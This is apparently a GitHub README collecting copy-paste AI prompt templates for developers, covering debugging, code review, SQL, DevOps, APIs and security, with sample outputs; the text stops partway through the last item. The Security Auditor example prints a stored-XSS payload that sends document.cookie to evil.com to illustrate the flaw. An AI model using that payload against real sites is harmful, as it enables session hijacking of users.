<![CDATA[<div align="center">

# 🧠 Awesome AI Prompts for Developers

**The most useful collection of AI prompts for software engineers. Battle-tested. Copy-paste ready.**

[![GitHub stars](https://img.shields.io/github/stars/dohko04/awesome-ai-prompts-for-devs?style=for-the-badge&logo=github&color=yellow)](https://github.com/dohko04/awesome-ai-prompts-for-devs/stargazers)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg?style=for-the-badge)](LICENSE)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=for-the-badge)](CONTRIBUTING.md)
[![Full Toolkit](https://img.shields.io/badge/🚀_Full_Toolkit-100%2B_Prompts_→_$9-blue?style=for-the-badge)](https://ai-dev-toolkit-five.vercel.app)

*Works with ChatGPT, Claude, Gemini, Copilot, and any LLM*

[**Get the Full Toolkit (100+ prompts) →**](https://ai-dev-toolkit-five.vercel.app)

</div>

---

## 📑 Table of Contents

- [🐛 Debugging](#-debugging)
- [🔍 Code Review](#-code-review)
- [🏗️ Architecture](#️-architecture)
- [🧪 Testing](#-testing)
- [📝 Documentation](#-documentation)
- [🗃️ Database & SQL](#️-database--sql)
- [⚙️ DevOps & CI/CD](#️-devops--cicd)
- [🔌 API Design](#-api-design)
- [📊 Data Engineering](#-data-engineering)
- [♻️ Refactoring](#️-refactoring)
- [🔒 Security](#-security)
- [🎯 Meta-Prompting](#-meta-prompting)
- [📦 Want More?](#-want-more)
- [🐉 About Dohko](#-about-dohko)
- [🤝 Contributing](#-contributing)
- [📄 License](#-license)

---

## 🐛 Debugging

### 1. The Bug Detective

> **When to use:** You have a bug and need systematic root-cause analysis instead of guessing.

```
I have a bug. Here's what I know:

**Expected behavior:** [what should happen]
**Actual behavior:** [what happens instead]
**Reproduction steps:** [how to trigger it]

Code:
[relevant code]

Error output (if any):
[errors/logs]

Help me:
1. Identify the most likely root cause
2. Explain WHY it's happening (not just what)
3. Provide the fix with code
4. Suggest how to prevent similar bugs in the future
```

<details>
<summary>💡 Example Output</summary>

**Input:** A React component re-renders infinitely when using `useEffect` with an object dependency.

**Output:**
> **Root cause:** You're passing an object literal as a dependency to `useEffect`. On every render, JavaScript creates a new object reference, so React thinks the dependency changed → triggers re-render → new object → infinite loop.
>
> **Fix:**
> ```javascript
> // ❌ Bad - new object reference every render
> useEffect(() => { fetchData(filters) }, [{ status: 'active', page: 1 }]);
>
> // ✅ Good - stable reference with useMemo
> const filters = useMemo(() => ({ status: 'active', page: 1 }), []);
> useEffect(() => { fetchData(filters) }, [filters]);
> ```
>
> **Prevention:** Use the `react-hooks/exhaustive-deps` ESLint rule and never pass inline objects/arrays as dependencies.

</details>

---

### 2. The Error Message Decoder

> **When to use:** You get a cryptic error message and need to understand what it actually means.

```
I'm getting this error and I don't understand it:

Error: [paste the full error message/stack trace]

Context:
- Language/Framework: [e.g., Python 3.11, React 18]
- What I was doing: [action that triggered it]
- Recent changes: [what changed before the error appeared]

Please:
1. Explain this error in plain English
2. List the top 3 most common causes
3. Show me how to fix each cause
4. Give me a diagnostic command/snippet to pinpoint which cause it is
```

<details>
<summary>💡 Example Output</summary>

**Input:** `ECONNREFUSED 127.0.0.1:5432` in a Node.js app.

**Output:**
> **Plain English:** Your app tried to connect to PostgreSQL on localhost port 5432, but nothing is listening there.
>
> **Top 3 causes:**
> 1. PostgreSQL isn't running → `sudo systemctl start postgresql`
> 2. It's running on a different port → check `postgresql.conf` for `port =`
> 3. You're in Docker and `localhost` means the container, not the host → use `host.docker.internal` or the service name
>
> **Diagnostic:** `pg_isready -h 127.0.0.1 -p 5432`

</details>

---

### 3. The Log Analyzer

> **When to use:** You have a wall of logs and need to find the needle in the haystack.

```
Analyze these application logs and find the problem:

[paste logs - up to 200 lines]

Context:
- The issue is: [describe the symptom]
- This started: [when it began]

Please:
1. Identify the first error/warning that matters
2. Trace the chain of events that led to the failure
3. Ignore noise — focus only on what's relevant
4. Suggest the fix
```

<details>
<summary>💡 Example Output</summary>

**Output:**
> **Key finding:** Line 47 shows `Connection pool exhausted` at 14:32:01, followed by cascading timeout errors.
>
> **Chain of events:**
> 1. 14:31:45 — Slow query on `users` table (took 12s instead of <100ms)
> 2. 14:31:50 — Connection pool filled up waiting for that query
> 3. 14:32:01 — New requests can't get connections → pool exhausted
> 4. 14:32:01+ — All subsequent requests fail with timeouts
>
> **Fix:** Add a query timeout (`statement_timeout = 5000`) and investigate the slow query with `EXPLAIN ANALYZE`.

</details>

---

## 🔍 Code Review

### 4. The Senior Dev Reviewer

> **When to use:** You want a thorough code review before merging — as if a senior engineer were looking at it.

```
Review this code as a senior software engineer. Be critical but constructive.

[paste code]

Focus on:
1. **Bugs** — Logic errors, off-by-one, race conditions, null handling
2. **Security** — Injection, auth issues, data exposure
3. **Performance** — Unnecessary work, N+1 queries, memory leaks
4. **Readability** — Naming, structure, complexity
5. **Best practices** — SOLID, DRY, error handling

For each issue:
- Severity: 🔴 Critical / 🟡 Warning / 🔵 Suggestion
- Line/section reference
- What's wrong and why
- How to fix it (with code)
```

<details>
<summary>💡 Example Output</summary>

**Output:**
> 🔴 **Critical — SQL Injection (line 23)**
> ```python
> # ❌ Current
> query = f"SELECT * FROM users WHERE id = {user_id}"
>
> # ✅ Fix — use parameterized query
> query = "SELECT * FROM users WHERE id = %s"
> cursor.execute(query, (user_id,))
> ```
>
> 🟡 **Warning — No error handling on API call (line 45)**
> The `requests.get()` call has no timeout and no try/except. If the service is down, your app hangs forever.
>
> 🔵 **Suggestion — Rename `data` variable (line 12)**
> `data` is too generic. Use `user_profile` or `payment_record` — future you will thank present you.

</details>

---

### 5. The PR Description Writer

> **When to use:** You've made changes and need a clear, professional pull request description.

```
Write a PR description for these changes:

**Diff/Changes:**
[paste git diff or describe the changes]

**Context:**
- Why: [reason for the change]
- Ticket: [JIRA/Linear ID if applicable]

Generate:
1. A clear title (conventional commits format)
2. Summary of what changed and why
3. How to test it
4. Any risks or things reviewers should watch for
5. Screenshots section placeholder (if UI changes)
```

<details>
<summary>💡 Example Output</summary>

**Output:**
> **Title:** `feat(auth): add rate limiting to login endpoint`
>
> **Summary:** Adds rate limiting (5 attempts/minute per IP) to the `/auth/login` endpoint to prevent brute-force attacks. Uses Redis sliding window counter.
>
> **How to test:**
> 1. Hit `/auth/login` with wrong credentials 6 times in 1 minute
> 2. Verify 6th attempt returns `429 Too Many Requests`
> 3. Wait 60 seconds, verify you can try again
>
> **Risks:** If Redis goes down, rate limiting fails open (allows all requests). Acceptable for now, tracked in PROJ-456.

</details>

---

## 🏗️ Architecture

### 6. The System Design Architect

> **When to use:** You need to design a new system or feature from scratch with clear architecture decisions.

```
Design a system for: [describe the feature/product]

Requirements:
- Users: [expected scale — 100? 10K? 1M?]
- Tech stack: [your current stack or "recommend one"]
- Constraints: [budget, timeline, team size, existing systems]
- Key features: [list 3-5 core features]

Provide:
1. High-level architecture diagram (ASCII art)
2. Component breakdown with responsibilities
3. Data flow for the main use case
4. Database schema (key tables only)
5. Top 3 technical risks and mitigations
6. Build vs Buy decisions
7. Phased implementation plan (MVP → V2 → Scale)
```

<details>
<summary>💡 Example Output</summary>

**Output (abbreviated):**
> ```
> ┌──────────┐     ┌──────────┐     ┌──────────┐
> │  Client  │────▶│ API GW   │────▶│ Auth Svc │
> │  (React) │     │ (Kong)   │     │ (JWT)    │
> └──────────┘     └────┬─────┘     └──────────┘
>                       │
>                  ┌────▼─────┐     ┌──────────┐
>                  │ Order Svc│────▶│ Postgres │
>                  └────┬─────┘     └──────────┘
>                       │
>                  ┌────▼─────┐
>                  │ Queue    │
>                  │ (SQS)   │
>                  └──────────┘
> ```
>
> **Phase 1 (MVP, 2 weeks):** Monolith with Auth + Orders. Single Postgres DB. Deploy on Railway/Render.
>
> **Risk #1:** Single DB becomes bottleneck at ~50K users → Mitigation: Read replicas + caching layer in Phase 2.

</details>

---

### 7. The Tech Stack Advisor

> **When to use:** You're starting a project and need to choose the right tools for the job.

```
I'm building: [describe the project]

Context:
- Team size: [number and skill level]
- Timeline: [deadline]
- Budget: [infrastructure budget]
- Must integrate with: [existing systems]
- Users: [expected traffic/load]

For each layer (frontend, backend, database, hosting, CI/CD), recommend:
1. Your top pick and WHY (not just what)
2. A runner-up alternative
3. What NOT to use and why
4. Monthly cost estimate at my scale
```

<details>
<summary>💡 Example Output</summary>

**Output (Backend layer):**
> **Top pick: Node.js + Fastify**
> Why: Your team knows JS, 2-week timeline is tight, and Fastify is 2x faster than Express with similar DX. TypeScript gives you type safety without the Java ceremony.
>
> **Runner-up: Python + FastAPI**
> Why: Better if you need ML/data integration later. Slightly slower dev speed for your JS team.
>
> **Avoid: Java Spring Boot**
> Why: Massive overkill for a 3-person team with a 2-week deadline. You'll spend more time on boilerplate than features.
>
> **Cost:** ~$7/mo on Railway (hobby) → ~$25/mo on Render (pro) at 10K users.

</details>

---

## 🧪 Testing

### 8. The Test Writer

> **When to use:** You have code that needs tests — unit, integration, or edge cases.

```
Write comprehensive tests for this code:

[paste code]

Requirements:
- Framework: [Jest/Pytest/RSpec/etc.]
- Cover: happy path, edge cases, error cases
- Mock external dependencies
- Each test should have a clear, descriptive name that explains the scenario

Also tell me:
- What's the ideal code coverage target for this code?
- Are there any untestable parts that should be refactored?
```

<details>
<summary>💡 Example Output</summary>

**Input:** A `calculateDiscount(price, userType, couponCode)` function.

**Output:**
> ```javascript
> describe('calculateDiscount', () => {
>   // Happy path
>   it('should apply 10% discount for premium users', () => { ... });
>   it('should apply coupon discount when valid code provided', () => { ... });
>   it('should stack user discount + coupon discount', () => { ... });
>
>   // Edge cases
>   it('should return 0 discount for price of 0', () => { ... });
>   it('should cap total discount at 50%', () => { ... });
>   it('should handle floating point precision (e.g., $19.99)', () => { ... });
>
>   // Error cases
>   it('should throw for negative price', () => { ... });
>   it('should ignore expired coupon codes', () => { ... });
>   it('should treat unknown userType as regular (no discount)', () => { ... });
> });
> ```
>
> **Coverage target:** 95%+ — this is pure business logic with no I/O, so full coverage is easy and valuable.

</details>

---

### 9. The Edge Case Finder

> **When to use:** You think your code works but want to know what you're missing.

```
Find edge cases and potential failures in this code:

[paste code]

Think about:
- Boundary values (0, -1, MAX_INT, empty string, null)
- Concurrency issues (race conditions, deadlocks)
- Network failures (timeouts, partial responses)
- Malicious input (injection, overflow)
- State issues (uninitialized, stale, corrupt)
- Platform differences (timezone, locale, OS)

For each edge case:
1. Describe the scenario
2. What happens currently (crash? wrong result? silent failure?)
3. How to handle it properly
```

<details>
<summary>💡 Example Output</summary>

**Input:** A function that parses user-uploaded CSV files.

**Output:**
> **Edge case 1: Empty file**
> Currently: Throws `index out of range` on line 12. Fix: Check `if len(rows) == 0: return []`
>
> **Edge case 2: File with headers but no data rows**
> Currently: Returns empty list. This is actually correct ✅
>
> **Edge case 3: CSV with 1 million rows**
> Currently: Loads entire file into memory → OOM crash. Fix: Use streaming/chunked reader.
>
> **Edge case 4: Fields containing commas or newlines**
> Currently: Breaks parsing. Fix: Use a proper CSV library instead of `.split(',')`.
>
> **Edge case 5: BOM character in UTF-8 file (common from Excel)**
> Currently: First column header has invisible `\ufeff` prefix → column lookup fails silently.

</details>

---

## 📝 Documentation

### 10. The README Generator

> **When to use:** You need a professional README for your open-source project.

```
Generate a comprehensive README.md for my project:

- Project name: [name]
- One-line description: [what it does]
- Tech stack: [languages, frameworks]
- Installation steps: [how to set up locally]
- Main features: [list key features]
- Target audience: [who is this for]

Include:
1. Badges (build status, license, version)
2. Quick start (< 3 minutes to first result)
3. Feature list with brief descriptions
4. Configuration options table
5. FAQ section (3-5 common questions)
6. Contributing section
7. License
```

<details>
<summary>💡 Example Output</summary>

**Output (abbreviated):**
> ```markdown
> # 🚀 FastQueue
> > A blazing-fast, Redis-backed job queue for Node.js. Process 10K jobs/sec with zero config.
>
> ![npm](https://img.shields.io/npm/v/fastqueue)
> ![build](https://img.shields.io/github/actions/workflow/status/...)
>
> ## Quick Start
> ```bash
> npm install fastqueue
> ```
> ```javascript
> const queue = new FastQueue({ redis: 'redis://localhost' });
> queue.add('email', { to: 'user@example.com' });
> ```
> Done. You're processing jobs. ✅
> ```

</details>

---

### 11. The Code Commenter

> **When to use:** You have complex code that needs inline documentation for your team.

```
Add clear, useful comments to this code. Follow these rules:

[paste code]

Rules:
1. DON'T comment obvious things (// increment i)
2. DO explain WHY, not WHAT
3. DO document non-obvious business logic
4. DO add JSDoc/docstring for public functions
5. DO flag potential gotchas with // ⚠️
6. Keep comments concise — one line when possible

Return the fully commented code.
```

<details>
<summary>💡 Example Output</summary>

**Output:**
> ```python
> def calculate_pricing(user, plan, billing_cycle):
>     """Calculate final price with all applicable adjustments.
>
>     Args:
>         user: User object with .created_at and .referral_code
>         plan: Plan enum (STARTER, PRO, ENTERPRISE)
>         billing_cycle: 'monthly' | 'annual'
>
>     Returns:
>         Decimal: Final price in USD (never negative)
>     """
>     base = PLAN_PRICES[plan]
>
>     # Annual billing gets 20% off — this is our main upsell lever
>     if billing_cycle == 'annual':
>         base *= Decimal('0.80')
>
>     # ⚠️ Grandfather clause: users before 2024 keep old pricing
>     if user.created_at < datetime(2024, 1, 1):
>         base = min(base, LEGACY_PRICES.get(plan, base))
>
>     return max(base, Decimal('0'))  # Guard against negative prices from stacked discounts
> ```

</details>

---

## 🗃️ Database & SQL

### 12. The Query Optimizer

> **When to use:** Your SQL query is slow and you need it fast.

```
Optimize this SQL query:

[paste query]

Table schemas:
[paste relevant CREATE TABLE statements or describe the schema]

Additional info:
- Database: [PostgreSQL/MySQL/SQLite/etc.]
- Table sizes: [approximate row counts]
- Current execution time: [if known]

Please:
1. Explain what the query does in plain English
2. Identify performance problems
3. Suggest indexes (with CREATE INDEX statements)
4. Rewrite the optimized query
5. Estimate the performance improvement
6. Show the EXPLAIN ANALYZE I should run to verify
```

<details>
<summary>💡 Example Output</summary>

**Output:**
> **Plain English:** "Find all orders from the last 30 days with their customer names, sorted by total amount."
>
> **Problems found:**
> 1. Missing index on `orders.created_at` — full table scan on 2M rows
> 2. `SELECT *` fetches 25 columns when you need 4
> 3. Subquery can be replaced with JOIN
>
> **Add these indexes:**
> ```sql
> CREATE INDEX idx_orders_created_at ON orders(created_at DESC);
> CREATE INDEX idx_orders_customer_id ON orders(customer_id);
> ```
>
> **Estimated improvement:** ~50x faster (from ~3s to ~60ms)

</details>

---

### 13. The Schema Designer

> **When to use:** You're designing a database from scratch or adding major features.

```
Design a database schema for: [describe the domain]

Requirements:
- [list key entities and relationships]
- Database: [PostgreSQL/MySQL/MongoDB/etc.]
- Scale: [expected data volume]

Provide:
1. Entity-Relationship overview (ASCII or text)
2. CREATE TABLE statements with appropriate types
3. Indexes for common query patterns
4. Constraints (unique, check, foreign keys)
5. Explain any denormalization decisions
6. Migration strategy if this extends an existing schema
```

<details>
<summary>💡 Example Output</summary>

**Output (abbreviated):**
> ```sql
> -- Core entities for a SaaS billing system
>
> CREATE TABLE organizations (
>     id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
>     name VARCHAR(255) NOT NULL,
>     plan plan_type NOT NULL DEFAULT 'free',
>     created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
> );
>
> CREATE TABLE subscriptions (
>     id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
>     org_id UUID NOT NULL REFERENCES organizations(id),
>     plan plan_type NOT NULL,
>     status subscription_status NOT NULL DEFAULT 'active',
>     current_period_end TIMESTAMPTZ NOT NULL,
>     -- Denormalized: avoids JOIN on every auth check
>     seats_used INT NOT NULL DEFAULT 0,
>     seats_limit INT NOT NULL DEFAULT 5
> );
>
> CREATE INDEX idx_sub_org_status ON subscriptions(org_id, status);
> ```

</details>

---

### 14. The Data Migration Planner

> **When to use:** You need to migrate data between schemas, databases, or formats safely.

```
I need to migrate data:

FROM: [current schema/structure/database]
TO: [target schema/structure/database]

Constraints:
- Downtime tolerance: [zero/minutes/hours]
- Data volume: [approximate size]
- Must preserve: [any specific data integrity rules]

Create a migration plan with:
1. Pre-migration checklist (backups, validation)
2. Step-by-step migration script
3. Rollback plan if something goes wrong
4. Data validation queries (before vs. after counts, checksums)
5. Estimated duration
```

<details>
<summary>💡 Example Output</summary>

**Output:**
> **Pre-migration checklist:**
> - [ ] Backup: `pg_dump -Fc mydb > pre_migration_backup.dump`
> - [ ] Verify row counts: `SELECT COUNT(*) FROM users; -- expect 145,832`
> - [ ] Notify team, set maintenance window
>
> **Rollback:** `pg_restore -d mydb pre_migration_backup.dump` (estimated: 3 min for this data size)

</details>

---

## ⚙️ DevOps & CI/CD

### 15. The Dockerfile Builder

> **When to use:** You need an optimized, production-ready Docker setup.

```
Create a production-ready Dockerfile for my application:

- Language/Framework: [e.g., Node.js 20, Python 3.12, Go 1.22]
- Build command: [e.g., npm run build]
- Start command: [e.g., node dist/server.js]
- Needs: [any system dependencies, e.g., ffmpeg, chromium]
- Env vars: [list required environment variables]

Requirements:
1. Multi-stage build (keep final image small)
2. Non-root user
3. Proper .dockerignore
4. Health check
5. Layer caching optimization
6. Security best practices
7. Include docker-compose.yml for local development
```

<details>
<summary>💡 Example Output</summary>

**Output:**
> ```dockerfile
> # Build stage
> FROM node:20-alpine AS builder
> WORKDIR /app
> COPY package*.json ./
> RUN npm ci --only=production && npm cache clean --force
> COPY . .
> RUN npm run build
>
> # Production stage
> FROM node:20-alpine
> RUN addgroup -g 1001 appgroup && adduser -u 1001 -G appgroup -s /bin/sh -D appuser
> WORKDIR /app
> COPY --from=builder --chown=appuser:appgroup /app/dist ./dist
> COPY --from=builder --chown=appuser:appgroup /app/node_modules ./node_modules
> USER appuser
> EXPOSE 3000
> HEALTHCHECK --interval=30s CMD wget -q --spider http://localhost:3000/health || exit 1
> CMD ["node", "dist/server.js"]
> ```
> Final image: ~150MB (vs ~900MB without multi-stage) 🎯

</details>

---

### 16. The CI/CD Pipeline Designer

> **When to use:** You need to set up or improve your CI/CD pipeline.

```
Design a CI/CD pipeline for my project:

- Repository: [GitHub/GitLab/Bitbucket]
- Language: [e.g., TypeScript, Python]
- Deployment target: [Vercel/AWS/GCP/Railway/etc.]
- Branch strategy: [main only / main + develop / gitflow]
- Requirements: [linting, tests, type checking, etc.]

Generate:
1. Complete workflow file (.github/workflows/ or .gitlab-ci.yml)
2. Stages: lint → test → build → deploy
3. Caching strategy for fast builds
4. Environment-specific deployments (staging/production)
5. Slack/Discord notifications on failure
6. Security scanning step
```

<details>
<summary>💡 Example Output</summary>

**Output (GitHub Actions):**
> ```yaml
> name: CI/CD
> on:
>   push:
>     branches: [main, develop]
>   pull_request:
>     branches: [main]
>
> jobs:
>   quality:
>     runs-on: ubuntu-latest
>     steps:
>       - uses: actions/checkout@v4
>       - uses: actions/setup-node@v4
>         with: { node-version: 20, cache: 'npm' }
>       - run: npm ci
>       - run: npm run lint
>       - run: npm run typecheck
>       - run: npm test -- --coverage
>
>   deploy:
>     needs: quality
>     if: github.ref == 'refs/heads/main'
>     # ...deployment steps
> ```

</details>

---

## 🔌 API Design

### 17. The REST API Designer

> **When to use:** You need to design a clean, well-documented REST API from scratch.

```
Design a REST API for: [feature/resource]

Context:
- What it does: [describe the feature]
- Who consumes it: [frontend app, mobile, third-party]
- Authentication: [JWT/API Key/OAuth]
- Expected load: [requests per minute]

Provide:
1. Endpoint list (method, path, description)
2. Request/response schemas (JSON with types)
3. Error response format (consistent across all endpoints)
4. Pagination strategy (cursor vs offset)
5. Rate limiting headers
6. Versioning strategy
7. OpenAPI/Swagger snippet for the main endpoint
```

<details>
<summary>💡 Example Output</summary>

**Output:**
> | Method | Path | Description |
> |--------|------|-------------|
> | GET | `/api/v1/products` | List products (paginated) |
> | GET | `/api/v1/products/:id` | Get product details |
> | POST | `/api/v1/products` | Create product |
> | PATCH | `/api/v1/products/:id` | Update product |
> | DELETE | `/api/v1/products/:id` | Soft-delete product |
>
> **Error format (all endpoints):**
> ```json
> {
>   "error": {
>     "code": "PRODUCT_NOT_FOUND",
>     "message": "Product with ID 'abc' does not exist",
>     "details": {},
>     "requestId": "req_abc123"
>   }
> }
> ```

</details>

---

### 18. The API Integration Helper

> **When to use:** You need to integrate with a third-party API quickly and correctly.

```
I need to integrate with [API name/URL].

Here's their documentation: [paste relevant docs or link]

My stack: [language/framework]

Generate:
1. A clean service class/module that wraps the API
2. Authentication setup
3. Error handling with retries and exponential backoff
4. Rate limiting compliance
5. TypeScript types / Python models for the responses
6. Unit tests with mocked responses
7. Usage example
```

<details>
<summary>💡 Example Output</summary>

**Output (abbreviated):**
> ```typescript
> class StripeService {
>   private client: Stripe;
>
>   constructor(apiKey: string) {
>     this.client = new Stripe(apiKey, { apiVersion: '2024-01-01' });
>   }
>
>   async createCheckout(params: CheckoutParams): Promise<CheckoutSession> {
>     try {
>       return await this.client.checkout.sessions.create({
>         mode: 'payment',
>         line_items: params.items,
>         success_url: params.successUrl,
>         cancel_url: params.cancelUrl,
>       });
>     } catch (error) {
>       if (error instanceof Stripe.errors.StripeRateLimitError) {
>         await this.delay(1000);
>         return this.createCheckout(params); // retry once
>       }
>       throw new PaymentError('Checkout creation failed', error);
>     }
>   }
> }
> ```

</details>

---

## 📊 Data Engineering

### 19. The ETL Pipeline Designer

> **When to use:** You need to extract, transform, and load data between systems.

```
Design an ETL pipeline:

Source: [database/API/file format — describe the data]
Destination: [data warehouse/database/file]
Frequency: [real-time / hourly / daily]
Volume: [rows per run, total data size]
Transformations needed: [list data transformations]

Provide:
1. Pipeline architecture (source → stages → sink)
2. Code for each stage (Python/SQL/your preferred language)
3. Error handling (what happens when source is down? duplicate data?)
4. Idempotency strategy (safe to re-run without duplicates)
5. Monitoring and alerting
6. Backfill strategy for historical data
```

<details>
<summary>💡 Example Output</summary>

**Output:**
> **Architecture:**
> ```
> [Postgres] → Extract (CDC) → [Kafka] → Transform (dbt) → [BigQuery] → [Dashboard]
> ```
>
> **Idempotency:** Use `MERGE`/`UPSERT` with natural keys. Each run processes a time window and can safely re-run:
> ```sql
> MERGE INTO analytics.orders AS target
> USING staging.orders AS source
> ON target.order_id = source.order_id
> WHEN MATCHED THEN UPDATE SET ...
> WHEN NOT MATCHED THEN INSERT ...
> ```

</details>

---

### 20. The Data Validation Prompt

> **When to use:** You need to validate data quality, find anomalies, or build data checks.

```
Create data validation checks for this dataset/table:

Schema: [describe columns, types, and what the data represents]
Business rules: [e.g., "price must be > 0", "email must be unique"]

Generate:
1. SQL queries to check each business rule
2. Anomaly detection queries (outliers, suspicious patterns)
3. Completeness checks (null rates per column)
4. Consistency checks (cross-table relationships)
5. A summary query that returns a "data health score"
6. Suggested automated monitoring (great-expectations/dbt tests)
```

<details>
<summary>💡 Example Output</summary>

**Output:**
> ```sql
> -- Data Health Dashboard
> SELECT
>   COUNT(*) as total_rows,
>   COUNT(*) FILTER (WHERE email IS NULL) as missing_emails,
>   COUNT(*) FILTER (WHERE price <= 0) as invalid_prices,
>   COUNT(*) - COUNT(DISTINCT email) as duplicate_emails,
>   ROUND(100.0 * COUNT(*) FILTER (WHERE price > 0 AND email IS NOT NULL) / COUNT(*), 1) as health_score_pct
> FROM orders;
> ```
> Health score: 98.5% → ✅ Healthy | <95% → ⚠️ Investigate | <90% → 🔴 Alert

</details>

---

## ♻️ Refactoring

### 21. The Code Refactorer

> **When to use:** You have working but messy code that needs to be cleaned up without changing behavior.

```
Refactor this code. It works, but it's a mess:

[paste code]

Goals:
- Maintain identical behavior (no functional changes)
- Improve readability and maintainability
- Apply [SOLID/DRY/Clean Code] principles
- Reduce complexity (aim for lower cyclomatic complexity)

Provide:
1. The refactored code
2. A bullet list of every change you made and why
3. Before/after complexity comparison
4. Any risks to watch for (subtle behavior changes)
```

<details>
<summary>💡 Example Output</summary>

**Output:**
> **Changes made:**
> - ✅ Extracted 3 functions from 80-line `processOrder()` → `validateOrder()`, `calculateTotal()`, `sendConfirmation()`
> - ✅ Replaced nested if/else (4 levels deep) with early returns
> - ✅ Renamed `d` → `discount`, `t` → `totalAmount`, `x` → `taxRate`
> - ✅ Moved magic numbers to named constants: `MAX_ITEMS = 100`, `TAX_RATE = 0.08`
>
> **Complexity:** Before: Cyclomatic complexity 14 → After: Max 4 per function
>
> **⚠️ Risk:** The original code silently swallowed errors on line 45. The refactored version now throws — verify this is desired.

</details>

---

### 22. The Legacy Code Modernizer

> **When to use:** You need to update old code to modern patterns without breaking things.

```
Modernize this legacy code:

[paste code]

Current: [language version, e.g., Python 2.7, ES5, Java 8]
Target: [modern version, e.g., Python 3.12, ES2024, Java 21]

Please:
1. Update to modern syntax and idioms
2. Replace deprecated APIs with current equivalents
3. Add type hints/annotations where applicable
4. Keep backward compatibility notes (if breaking changes exist)
5. List every deprecated feature you replaced and its modern equivalent
```

<details>
<summary>💡 Example Output</summary>

**Output:**
> | Old (ES5) | Modern (ES2024) | Why |
> |-----------|-----------------|-----|
> | `var` | `const`/`let` | Block scoping, prevents hoisting bugs |
> | `function(x) { return x*2 }` | `(x) => x * 2` | Concise, lexical `this` |
> | `$.ajax()` | `fetch()` + `async/await` | Native, no jQuery dependency |
> | `for (var i = 0; ...)` | `for (const item of items)` | Cleaner iteration |
> | `obj.hasOwnProperty('key')` | `Object.hasOwn(obj, 'key')` | Safer, works with `Object.create(null)` |

</details>

---

## 🔒 Security

### 23. The Security Auditor

> **When to use:** You want to find security vulnerabilities in your code before attackers do.

```
Perform a security audit on this code:

[paste code]

Context:
- This code handles: [auth/payments/user data/file uploads/etc.]
- Exposed to: [public internet / internal only / admin only]
- Framework: [Express/Django/Rails/etc.]

Check for:
1. Injection vulnerabilities (SQL, XSS, command injection)
2. Authentication/authorization flaws
3. Data exposure (logs, error messages, API responses)
4. Cryptography issues (weak hashing, hardcoded secrets)
5. Dependency vulnerabilities
6. OWASP Top 10 compliance

For each finding:
- Severity: Critical / High / Medium / Low
- CWE reference
- Exploit scenario (how an attacker would use this)
- Fix with code example
```

<details>
<summary>💡 Example Output</summary>

**Output:**
> **🔴 Critical — Stored XSS (CWE-79)**
> ```javascript
> // ❌ Current: user input rendered as HTML
> element.innerHTML = userComment;
>
> // ✅ Fix: use textContent or sanitize
> element.textContent = userComment;
> // OR: DOMPurify.sanitize(userComment)
> ```
> **Exploit:** Attacker submits `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` as a comment. Every user who views the page sends their session cookie to the attacker.
>
> **🟡 Medium — Verbose Error Messages (CWE-209)**
> Your catch block returns `error.stack` to the client. This reveals internal file paths and line numbers. Return a generic message instead.

</details>

---

### 24. The Environment & Secrets Checker

> **When to use:** Before deploying, verify you're not leaking secrets or misconfiguring environments.

```
Review my project for secrets and configuration security:

Files to check:
[paste .env.example, docker-compose.yml, config files, or describe your setup]

Verify:
1. No hardcoded secrets (API keys, passwords, tokens)
2. .gitignore properly excludes sensitive files
3. Environment variables are validated at startup
4. Secrets rotation strategy exists
5. Different configs for dev/staging/prod
6. No sensitive data in logs or error messages

Provide a security checklist I can run before every deployment.
```

<details>
<summary>💡 Example Output</summary>

**Output:**
> **Pre-deployment security checklist:**
> - [ ] `git log --all -p | grep -i "password\|secret\|api_key"` → 0 results
> - [ ] `.env` is in `.gitignore` ✅
> - [ ] All secrets come from env vars, not config files ✅
> - [ ] `DATABASE_URL` uses SSL in production (`?sslmode=require`) ❌ **Fix this**
> - [ ] Error responses don't include stack traces in production ✅
> - [ ] CORS is restricted to known domains (not `*`) ❌ **Fix this**

</details>

---

## 🎯 Meta-Prompting

### 25. The Prompt Improver

> **When to use:** You have a prompt that kinda works but you want it to be great.

```
Improve this prompt I've been using:

[paste your current prompt]

What I want it to do: [expected output]
What it actually produces: [current issues with output]

Please:
1. Rewrite the prompt to be more effective
2. Explain each change you made and why
3. Add structure (numbered steps, output format)
4. Include constraints to prevent common failure modes
5. Give me 3 variations for different scenarios
```

<details>
<summary>💡 Example Output</summary>

**Output:**
> **Changes made:**
> 1. Added role context ("You are a senior backend engineer") — LLMs perform better with persona framing
> 2. Added explicit output format — prevents rambling responses
> 3. Added "Think step by step" — improves reasoning accuracy by ~15% per research
> 4. Added negative constraints ("Do NOT include boilerplate") — prevents common filler
> 5. Added example of desired output — few-shot learning beats zero-shot

</details>

---

### 26. The AI Pair Programmer Setup

> **When to use:** You're starting a coding session and want to configure AI as your pair programmer.

```
You are my pair programming partner for this session. Here's the context:

Project: [describe the project]
Tech stack: [languages, frameworks, tools]
My skill level: [junior/mid/senior — be honest, it helps]
Today's goal: [what we're building/fixing]
Coding style preferences:
- [e.g., functional over OOP, prefer explicit over clever]
- [e.g., always handle errors, never use any]

Rules for this session:
1. Ask clarifying questions BEFORE writing code
2. Explain your reasoning briefly, not lectures
3. When I share code, assume it's the current version (not aspirational)
4. If you see a bug or issue, flag it immediately
5. Suggest tests for every function we write
6. Use [language] idioms and best practices
```

<details>
<summary>💡 Example Output</summary>

**Output:**
> Got it! I'm your pair for today. Quick summary:
> - Building a webhook handler for Stripe events in Node.js/Express
> - You're mid-level, comfortable with async/await
> - Style: TypeScript strict, explicit error handling, functional where sensible
>
> Before we start — two questions:
> 1. Are you verifying webhook signatures? (Critical for security)
> 2. Which events do you need to handle? (checkout.session.completed? invoice.paid? all of them?)

</details>

---

### 27. The Learning Accelerator

> **When to use:** You need to learn a new technology fast — for a job, project, or interview.

```
I need to learn [technology/concept] quickly.

Context:
- I already know: [related technologies you know]
- I need it for: [job interview / new project / curiosity]
- Timeline: [how much time I have]
- Learning style: [examples-first / theory-first / project-based]

Create a learning plan:
1. Core concepts I must understand (ordered by importance)
2. The "20% that gives 80% of value"
3. Hands-on exercises for each concept (progressively harder)
4. Common mistakes beginners make (so I can skip them)
5. Resources: 1 video, 1 article, 1 interactive tutorial
6. A "build this" project to cement the knowledge
```

<details>
<summary>💡 Example Output</summary>

